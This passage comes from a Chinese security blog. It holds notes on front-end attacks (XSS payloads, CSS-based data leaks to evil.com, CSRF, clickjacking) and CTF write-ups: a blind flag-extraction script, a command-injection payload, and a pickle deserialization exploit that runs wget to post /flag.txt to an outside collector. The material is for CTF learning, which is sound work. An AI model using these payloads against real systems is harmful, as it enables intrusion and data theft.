<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _eval=<span class="built_in">eval</span>;</span><br><span class="line"><span class="built_in">eval</span>=<span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span>(x)==<span class="string">'undefined'</span>)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">    alert(x);</span><br><span class="line">    _eval(x); <span class="comment">// 这是原本的eval函数</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">'alert(1)'</span>);</span><br></pre></td></tr></table></figure>
<p>在现代浏览器中需要改一改</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _write=<span class="built_in">document</span>.write.bind(<span class="built_in">document</span>);</span><br><span class="line"><span class="comment">// 由于默认是在window对象下寻找write方法, 而window对象就没有这个方法, 如果不绑定的话, 接下来的_write执行就会报错</span></span><br><span class="line"><span class="built_in">document</span>.write = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span>(x)==<span class="string">'undefined'</span>)&#123;<span class="keyword">return</span> ;&#125;</span><br><span class="line">    <span class="comment">// any evil code</span></span><br><span class="line">    _write(x);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>);</span><br></pre></td></tr></table></figure>
<h3 id="CSS-容错性">CSS 容错性</h3>
<p>如果css样式块中出现非法字符, 并不影响解析, 但是如果样式块前面有大量的不合法数据的话, 可以</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;title&gt;1&lt;/title&gt;</span><br><span class="line">.....</span><br><span class="line">&lt;div&gt;....&lt;/div&gt;</span><br><span class="line">&#123;&#125;<span class="selector-tag">h1</span>&#123;<span class="attribute">font-size</span>:<span class="number">50px</span>;<span class="attribute">color</span>:red</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div&gt;xxxx&lt;/div&gt;</span><br><span class="line">&#125;<span class="selector-tag">h2</span>&#123;<span class="attribute">color</span>:green&#125;</span><br></pre></td></tr></table></figure>
<p>h1前面加上<code>{}</code>就可以了</p>
<h3 id="CSS伪类">CSS伪类</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;http://www.baidu.com/&quot; id=&quot;a1&quot;&gt;http://www.baidu.com/&lt;/a&gt;&lt;br /&gt;</span><br></pre></td></tr></table></figure>
<p>并针对id设置样式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#a1:visited &#123;background: url(http://www.evil.com/css/steal.php?data=a1);&#125;</span><br></pre></td></tr></table></figure>
<p>只要href存在于历史记录中, 就会发送请求</p>
<h3 id="CSS-属性选择">CSS 属性选择</h3>
<p>比如</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">style</span>&gt;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^="x"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://www.evil.com/css/steal.php?data=0x);&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">attr selector: &lt;input type="text" value="xyz" /&gt;&lt;br /&gt;</span><br></pre></td></tr></table></figure>
<p>如果value的值(xyz)是x开头的话,<a href="http://xn--www-p18dohqgo0d52tjttjx0byz5bj56a87kx8b.evil.com" target="_blank" rel="noopener">那么就会发送一个请求给www.evil.com</a> , 有点盲注的感觉?</p>
<h2 id="第三章-前端黑客之XSS">第三章 前端黑客之XSS</h2>
<h3 id="DOM-xss概念">DOM xss概念</h3>
<p>比如</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="built_in">eval</span>(location.hash.substr(<span class="number">1</span>));</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>拥有这段代码的页面会将锚点后的字符串执行, URL并不会发向服务端, 这整个过程和服务端完全无关, 靠的是浏览器的DOM解析, 可以认为<strong>完全是客户端的事情</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.open(xxx)</span><br><span class="line">window.open(xxx)</span><br><span class="line">window.location.href=...</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval(xxx)</span><br><span class="line">window.execScript(xxx)</span><br><span class="line">window.setInterval(xxx)</span><br><span class="line">window.setTimeout(xxx)</span><br></pre></td></tr></table></figure>
<h2 id="第四章-前端黑客之CSRF">第四章 前端黑客之CSRF</h2>
<p>比如</p>
<p><a href="http://xn--www-5d2e139fl8cup3dp60a.b.com" target="_blank" rel="noopener">攻击者构造www.b.com</a> 并诱发受害人打开页面, 打开的时候代码触发, 向www.a.com发送了转账的get请求, 而在打开b之前要求已经完成了银行的身份验证, 这就是CSRF.</p>
<blockquote>
<p>同源策略可以限制客户端脚本的跨域请求行为, 但是实际上, 由客户端HTML标签发出的跨域GET请求和POST请求是合法的, 不在同源策略的限制中</p>
</blockquote>
<p>可以没有js参与</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://www.evil.com</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">new</span> Image().src= <span class="string">'http://evil.com'</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里脚本只是生成img对象, 并没有参与跨站, 不会被同源策略阻挠.</p>
<p>注意:</p>
<p>IE的策略里面, 两种cookie中, 本地cookie是不允许在跨域请求中被带上, 除非设置P3P, 其他浏览器没这种限制</p>
<h3 id="HTML可以发起GET请求的标签">HTML可以发起GET请求的标签</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;link href=&apos;&apos;&gt;</span><br><span class="line">&lt;img src=&apos;&apos;&gt;</span><br><span class="line">&lt;img lowsrc=&apos;&apos;&gt;</span><br><span class="line">&lt;img dynsrc=&apos;&apos;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;&quot;&gt;</span><br><span class="line">&lt;frame src=&quot;&quot;&gt;</span><br><span class="line">&lt;script src=&quot;&quot;&gt;</span><br><span class="line">&lt;bgsound src=&quot;&quot;&gt;</span><br><span class="line">&lt;embed src=&quot;&quot;&gt;</span><br><span class="line">&lt;video src=&quot;&quot;&gt;</span><br><span class="line">&lt;audio src=&quot;&quot;&gt;</span><br><span class="line">&lt;a href=&quot;&quot;&gt;</span><br><span class="line">&lt;table background=&quot;&quot;&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h3 id="CSS中的发GET请求">CSS中的发GET请求</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@import &quot;&quot;</span><br><span class="line">background:url(&quot;&quot;)</span><br></pre></td></tr></table></figure>
<h3 id="JSON-HiJacking">JSON HiJacking</h3>
<p>自定义回调函数, 将AJAX中响应数据中的JSOn作为参数并处理(用参数中的cookie来发送请求之类的</p>
<h2 id="前端黑客之界面操作劫持">前端黑客之界面操作劫持</h2>
<blockquote>
<p>界面劫持操作时一种基于视觉欺骗的web会话劫持攻击, 它通过在网页的可见输入控件上覆盖一个不可见的框(iframe), 是的用户误以为在操作可见控件, 而实际上用户的操作行为被其不可见的框所劫持, 执行不可见框中的恶意代码, 从而完成在用户不知情的情况下窃取敏感信息, 篡改数据等攻击. 主要分为</p>
<ul>
<li>点击劫持(Clickjacking)</li>
<li>拖放劫持(Drag&amp;Drop jacking) 在浏览器中, <strong>拖放操作是不受同源策略限制的, 用户可以把一个域的内容拖放到另一个不同的域</strong></li>
<li>触屏劫持(Tapjacking)</li>
</ul>
</blockquote>
<p>这块部分以后再补</p>
<h2 id="漏洞挖掘">漏洞挖掘</h2>
<h3 id="CSRF-思路">CSRF 思路</h3>
<ul>
<li>目标表单是否有有效的token随机串</li>
<li>目标表单是否有验证码</li>
<li>目标是否判断referer来源</li>
<li>网站根目录下crossdomain.xml的allow-access-from domain是否是通配符</li>
<li>目标json数据是否可以自定义callback函数等</li>
</ul>
<h3 id="界面劫持">界面劫持</h3>
<ul>
<li>目标http响应头是否设置x-frame-options</li>
<li>目标是否有javascript的frame busting机制</li>
<li>用iframe嵌入目标网站试试</li>
</ul>
<h3 id="xss挖掘">xss挖掘</h3>
<p>一个最普通的URL如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;scheme&gt;://&lt;netloc&gt;/&lt;path&gt;?&lt;query&gt;#&lt;fragment&gt;</span><br></pre></td></tr></table></figure>
<p>一般来说<code>&lt;fragment&gt;</code>的值不会出现在服务器端解析, 除非web2.0网站, 可能会用ajax来将fragment作为参数来进行各种局部页面刷新</p>
<h4 id="html标签之间">html标签之间</h4>
<p>在这些标签之间无法执行脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;textarea&gt;&lt;/textarea&gt;</span><br><span class="line">&lt;xmp&gt;&lt;/xmp&gt;</span><br><span class="line">&lt;iframe&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;noscript&gt;&lt;/noscript&gt;</span><br><span class="line">&lt;noframes&gt;&lt;/noframes&gt;</span><br><span class="line">&lt;plaintext&gt;&lt;/plaintext&gt;</span><br></pre></td></tr></table></figure>
<p>如果想执行, 那只能先把这些标签统统闭合了再起一个<code>&lt;script&gt;</code>标签.</p>
<h4 id="html标签之内">html标签之内</h4>
<p>对于<code>&lt;input type=&quot;text&quot; value=&quot;[输出]&quot;/&gt;</code></p>
<ul>
<li><code>&quot; on mouseover=alert(1) x=&quot;</code>来闭合属性</li>
<li><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>闭合标签和属性, 后面的东西不用管他</li>
</ul>
<p>hidden属性会让xss无法触发, 比如下面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;input value=&quot;[输出]&quot; type=&quot;hidden&quot; /&gt;</span><br></pre></td></tr></table></figure>
<p>这个时候可以覆盖type</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&quot; onmouseover=alert(1) type=&quot;text</span><br><span class="line">==&gt;</span><br><span class="line">&lt;input value=&quot;1&quot; onmouseover=alert(1) type=&quot;text&quot; type=&quot;hidden&quot; /&gt;</span><br></pre></td></tr></table></figure>
<p>对于不同的属性, 也有不同的payload</p>
<h5 id="输出在src-href-action等属性中">输出在src/href/action等属性中</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javascript:alert(1)//</span><br><span class="line">data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</span><br><span class="line"></span><br><span class="line">(PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==  ==&gt; &lt;script&gt;alert(1)&lt;/script&gt;)</span><br></pre></td></tr></table></figure>
<p>如果注释符号被过滤了, 那么可以利用javascript的逻辑运算符号, 因为是弱类型语言, 所以这样是合法的</p>
<h5 id="输出在on-事件中">输出在on*事件中</h5>
<p><strong>on*事件内是可以执行javascript脚本的</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;#&quot; onclick=&quot;alert(1)&quot;&gt;dd&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<h5 id="输出在style属性内">输出在style属性内</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;#&quot; style=&quot;width:1;xss:expression(if(!window.x)&#123;alert(1);window.x=1;&#125;)&quot;&gt;click me&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<h4 id="成为javascript代码的值">成为javascript代码的值</h4>
<p>闭合script标签或者是双引号单引号什么的</p>
<h4 id="关于转义">关于转义</h4>
<p>当上下文是html的时候, html编码是可以自动转换回来的, 但是当上下文是javascript 的时候就不会.</p>
<p>而javascript上下文环境会自动解码的情况有仨</p>
<ul>
<li>Unicode形式: \uH</li>
<li>普通16进制</li>
<li>在字符前面加上斜杆的纯转义</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>MiscInWeb &amp; python web[working forever]</title>
    <url>/2019/05/27/MiscInWeb/</url>
    <content><![CDATA[<h2 id="PyCalX-1-2">PyCalX 1&amp;2</h2>
<p>计算器类型的题目, 查看源代码是python写的</p>
<p><img src="/images/image-20200124235654925.png" alt="image-20200124235654925"></p>
<h3 id="第一小题">第一小题</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> cgi;</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> html <span class="keyword">import</span> escape</span><br><span class="line"></span><br><span class="line">FLAG = open(<span class="string">'/var/www/flag'</span>,<span class="string">'r'</span>).read()</span><br><span class="line"></span><br><span class="line">OK_200 = <span class="string">"""Content-type: text/html</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"&gt;</span></span><br><span class="line"><span class="string">&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;PyCalx&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h1&gt;PyCalx&lt;/h1&gt;</span></span><br><span class="line"><span class="string">&lt;form&gt;</span></span><br><span class="line"><span class="string">&lt;input class="form-control col-md-4" type=text name=value1 placeholder='Value 1 (Example: 1  abc)' autofocus/&gt;</span></span><br><span class="line"><span class="string">&lt;input class="form-control col-md-4" type=text name=op placeholder='Operator (Example: + - * ** / // == != )' /&gt;</span></span><br><span class="line"><span class="string">&lt;input class="form-control col-md-4" type=text name=value2 placeholder='Value 2 (Example: 1  abc)' /&gt;</span></span><br><span class="line"><span class="string">&lt;input class="form-control col-md-4 btn btn-success" type=submit value=EVAL /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;a href='?source=1'&gt;Source&lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">print(OK_200)</span><br><span class="line">arguments = cgi.FieldStorage()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'source'</span> <span class="keyword">in</span> arguments:</span><br><span class="line">    source = arguments[<span class="string">'source'</span>].value</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    source = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> source == <span class="string">'1'</span>:</span><br><span class="line">    print(<span class="string">'&lt;pre&gt;'</span>+escape(str(open(__file__,<span class="string">'r'</span>).read()))+<span class="string">'&lt;/pre&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'value1'</span> <span class="keyword">in</span> arguments <span class="keyword">and</span> <span class="string">'value2'</span> <span class="keyword">in</span> arguments <span class="keyword">and</span> <span class="string">'op'</span> <span class="keyword">in</span> arguments:</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_value</span><span class="params">(val)</span>:</span></span><br><span class="line">        val = str(val)[:<span class="number">64</span>]</span><br><span class="line">        <span class="keyword">if</span> str(val).isdigit(): <span class="keyword">return</span> int(val)</span><br><span class="line">        blacklist = [<span class="string">'('</span>,<span class="string">')'</span>,<span class="string">'['</span>,<span class="string">']'</span>,<span class="string">'\''</span>,<span class="string">'"'</span>] <span class="comment"># I don't like tuple, list and dict.</span></span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">''</span> <span class="keyword">or</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> blacklist <span class="keyword">if</span> c <span class="keyword">in</span> val] != []:</span><br><span class="line">            print(<span class="string">'&lt;center&gt;Invalid value&lt;/center&gt;'</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_op</span><span class="params">(val)</span>:</span></span><br><span class="line">        val = str(val)[:<span class="number">2</span>]</span><br><span class="line">        list_ops = [<span class="string">'+'</span>,<span class="string">'-'</span>,<span class="string">'/'</span>,<span class="string">'*'</span>,<span class="string">'='</span>,<span class="string">'!'</span>]</span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">''</span> <span class="keyword">or</span> val[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> list_ops:</span><br><span class="line">            print(<span class="string">'&lt;center&gt;Invalid op&lt;/center&gt;'</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">    op = get_op(arguments[<span class="string">'op'</span>].value)</span><br><span class="line">    value1 = get_value(arguments[<span class="string">'value1'</span>].value)</span><br><span class="line">    value2 = get_value(arguments[<span class="string">'value2'</span>].value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> str(value1).isdigit() ^ str(value2).isdigit():</span><br><span class="line">        print(<span class="string">'&lt;center&gt;Types of the values don\'t match&lt;/center&gt;'</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    calc_eval = str(repr(value1)) + str(op) + str(repr(value2))</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'&lt;div class=container&gt;&lt;div class=row&gt;&lt;div class=col-md-2&gt;&lt;/div&gt;&lt;div class="col-md-8"&gt;&lt;pre&gt;'</span>)</span><br><span class="line">    print(<span class="string">'&gt;&gt;&gt;&gt; print('</span>+escape(calc_eval)+<span class="string">')'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = str(eval(calc_eval))</span><br><span class="line">        <span class="keyword">if</span> result.isdigit() <span class="keyword">or</span> result == <span class="string">'True'</span> <span class="keyword">or</span> result == <span class="string">'False'</span>:</span><br><span class="line">            print(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"Invalid"</span>) <span class="comment"># Sorry we don't support output as a string due to security issue.</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"Invalid"</span>)</span><br><span class="line">    print(<span class="string">'&gt;&gt;&gt; &lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;'</span>)</span><br></pre></td></tr></table></figure>
<p>流程基本就是对<code>value1</code>和<code>value2</code>还有<code>op</code>做一个过滤然后执行<code>'value1' op 'value2'</code>这样的操作, 构造</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">value1: p</span><br><span class="line">op: +&apos;</span><br><span class="line">value2: and source in FLAG#</span><br><span class="line">==&gt; &apos;p&apos; +&apos;&apos;and source in FLAG#&apos;</span><br></pre></td></tr></table></figure>
<p>并通过原来用于显示源代码的source变量来传递比较字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://21761d39-5ae7-47e8-8fa4-b711c17ced3a.node3.buuoj.cn/cgi-bin/pycalx.py?source=&#123;0&#125;&amp;value1=&#123;1&#125;&amp;value2=&#123;2&#125;&amp;op=&#123;3&#125;"</span></span><br><span class="line"></span><br><span class="line">value1 = <span class="string">"p"</span></span><br><span class="line">op = urllib.parse.quote(<span class="string">"+'"</span>)</span><br><span class="line">value2 = urllib.parse.quote(<span class="string">"and source in FLAG#"</span>)</span><br><span class="line">known = <span class="string">"flag&#123;"</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line">        source = urllib.parse.quote(known + i)</span><br><span class="line">        <span class="comment"># print(url.format(source, value1, value2, op))</span></span><br><span class="line">        res = requests.get(url.format(source, value1, value2, op)).text</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"True"</span> <span class="keyword">in</span> res:</span><br><span class="line">            known += i</span><br><span class="line">            print(known)</span><br><span class="line">            breaksour</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<h3 id="第二小题">第二小题</h3>
<p>第一小题的op获取是这样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">op = get_op(arguments[&apos;op&apos;].value)</span><br></pre></td></tr></table></figure>
<p>第二小题是这样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">op = get_op(get_value(arguments[&apos;op&apos;].value))</span><br></pre></td></tr></table></figure>
<p>也就是说过滤了单引号, 看wp是使用format语句来执行的, 但是我照着复现的时候没打出来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">value1 = a</span><br><span class="line">value2 =&#123;source*0 if source in FLAG else 233&#125;</span><br><span class="line">op = +f</span><br><span class="line">==&gt; &apos;a&apos;+f&apos;&#123;source*0 if source in FLAG else 233&#125;&apos;</span><br></pre></td></tr></table></figure>
<h2 id="HarekazeCTF2019-Avatar-Uploader-1">HarekazeCTF2019 Avatar Uploader 1</h2>
<p>原来是个misc题目</p>
<p>可以上传文件, 只允许上传png , 关键源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">// check file size</span><br><span class="line">if ($_FILES[&apos;file&apos;][&apos;size&apos;] &gt; 256000) &#123;</span><br><span class="line">  error(&apos;Uploaded file is too large.&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// check file type</span><br><span class="line">$finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">$type = finfo_file($finfo, $_FILES[&apos;file&apos;][&apos;tmp_name&apos;]);</span><br><span class="line">finfo_close($finfo);</span><br><span class="line">if (!in_array($type, [&apos;image/png&apos;])) &#123;</span><br><span class="line">  error(&apos;Uploaded file is not PNG format.&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// check file width/height</span><br><span class="line">$size = getimagesize($_FILES[&apos;file&apos;][&apos;tmp_name&apos;]);</span><br><span class="line">if ($size[0] &gt; 256 || $size[1] &gt; 256) &#123;</span><br><span class="line">  error(&apos;Uploaded image is too large.&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if ($size[2] !== IMAGETYPE_PNG) &#123;</span><br><span class="line">  // I hope this never happens...</span><br><span class="line">  error(&apos;What happened...? OK, the flag for part 1 is: &lt;code&gt;&apos; . getenv(&apos;FLAG1&apos;) . &apos;&lt;/code&gt;&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同时使用了<code>finfo_open</code>和<code>getimagesize</code>来判断类型, 前者可以识别png图片的第一行16进制的东西, 后者不行.</p>
<p><img src="/images/image-20200110151652743.png" alt="image-20200110151652743"></p>
<p>上传这个就可以了</p>
<h2 id="GXYCTF-2019-禁止套娃">GXYCTF 2019 禁止套娃</h2>
<p>.git文件泄露, 泄露出来的源码和真实源码竟然有差异, 我傻了</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(scandir(chr(ord(hebrevc(crypt(phpversion()))))));</span><br><span class="line">readfile(next(array_reverse(scandir(chr(ord(hebrevc(crypt(phpversion()))))))));</span><br></pre></td></tr></table></figure>
<p><img src="/images/image-20191230154140515.png" alt="image-20191230154140515"></p>
<p><img src="/images/image-20191230153904533.png" alt="image-20191230153904533"></p>
<h2 id="GXYCTF-2019-pingpingping">GXYCTF 2019 pingpingping</h2>
<p>开局很简单, 题目让我们用get方式传入ip, 并在后台执行&quot;ping -c 4 &quot;这个ip的命令, 经过测试发现过滤花括号空格等符号,</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1;cat$IFS`ls`</span><br></pre></td></tr></table></figure>
<p>利用的是反引号内的东西可以作为命令进行执行的特征</p>
<h2 id="忘了题目名字了">忘了题目名字了</h2>
<p><img src="https://user-images.githubusercontent.com/40637063/61510960-a5959180-aa27-11e9-8e97-85fc732fb9ec.png" alt="1563077535097"></p>
<p>脚本找lv6会员</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://web44.buuoj.cn/shop?page="</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">1000</span>):</span><br><span class="line">    res = requests.get(url+str(i)).content</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"lv6"</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">print</span> i</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>进去改价格和折扣,把折扣改成很低的一个值就会跳转到一个admin界面,但是要登录admin.</p>
<p>这题用了jwt,先解码再用工具爆破得到了secretkey,然后用这个去伪造admin的jwt,登录.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61510982-bd6d1580-aa27-11e9-8e6f-edf56d75bd82.png" alt="1563074249024"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61510999-d4136c80-aa27-11e9-8478-25a46b4e985d.png" alt="1563077458061"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511037-f5745880-aa27-11e9-9b44-d3a98d308606.png" alt="1563074188880"></p>
<p>关键的源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span><span class="params">(BaseHandler)</span>:</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">"admin"</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'no_ass.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">'become'</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>这里是python的反序列化漏洞,脚本如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">"wget 'http://xss.buuoj.cn/index.php?do=api&amp;id=Krwr7k' --post-data='location='`cat /flag.txt` -O-"</span>,))</span><br><span class="line"></span><br><span class="line">a=test()</span><br><span class="line">payload=pickle.dumps(a)</span><br><span class="line">print(urllib.quote(payload))</span><br></pre></td></tr></table></figure>
<p>当序列化的过程中,<code>__reduce__</code>函数描述这个类在反序列化的时候该如何重构,今儿造成了命令执行.</p>
<p>使用xss.buuoj.cn建立内网的xss平台并且监听,然后burp发送payload如下:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511066-12a92700-aa28-11e9-8ddf-65531fc3310b.png" alt="1563076232369"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511084-23f23380-aa28-11e9-90b9-24def8a283d6.png" alt="1563076325322"></p>
<h2 id="CISCN-2019-东南赛区-web4">CISCN 2019 东南赛区 web4</h2>
<p>读app.py源代码</p>
